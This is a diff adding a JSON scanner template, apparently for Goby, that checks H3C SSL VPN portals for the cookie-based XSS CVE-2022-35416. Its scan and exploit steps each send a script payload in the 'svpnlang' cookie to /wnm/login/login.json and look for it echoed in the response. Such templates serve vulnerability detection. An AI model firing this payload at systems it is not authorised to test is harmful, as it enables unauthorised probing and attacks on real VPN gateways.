@@ -1,0 +1,101 @@
+{
+      "Name": "H3C SSL VPN cookie XSS CVE-2022-35416",
+      "Level": "1",
+      "Tags": [
+            "xss"
+      ],
+      "GobyQuery": "product=\"H3C-SSL-VPN\"",
+      "Description": "H3C SSL VPN",
+      "Product": "H3C SSL VPN",
+      "Homepage": "https://www.h3c.com/",
+      "Author": "",
+      "Impact": "H3C SSL VPN through 2022-07-10 allows wnm/login/login.json svpnlang cookie XSS.",
+      "Recommendation": "",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-35416"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wnm/login/login.json",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "svpnlang=<script>alert('document.domain')</script>"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "alert('document.domain')",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/wnm/login/login.json",
+                        "follow_redirect": false,
+                        "header": {
+                              "Cookie": "svpnlang=<script>alert('document.domain')</script>"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "alert('document.domain')",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
